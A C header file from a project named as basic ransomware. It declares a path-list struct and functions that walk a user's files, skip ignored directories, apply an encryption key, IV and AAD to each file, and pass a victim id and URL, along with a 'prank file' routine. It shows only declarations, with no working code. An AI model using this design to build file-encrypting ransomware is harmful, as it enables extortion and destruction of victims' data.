//
//
//

#ifndef BASIC_C_RANSOMWARE_FILES_H
#define BASIC_C_RANSOMWARE_FILES_H

typedef struct {
    char **paths;
    size_t count;
    size_t capacity;
} PathList;

void freePathList(PathList *pathList);
void addToPathList(PathList *pathList, const char *path);
void initPathList(PathList *pathList);
void linuxListFiles(const char *path, PathList *pathList);
void create_prank_file();
void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
void write_to_file(char *filename, char *value, int size);
void create_prank_file();
char* get_user_path();
void handle_file(const char *path, const char *id, const char *URL, unsigned char *key, unsigned char *iv, unsigned char *aad);
int should_ignore_file(const char *path, const char *ignoreDirs[], size_t num_ignoreDirs);

#endif //BASIC_C_RANSOMWARE_FILES_H
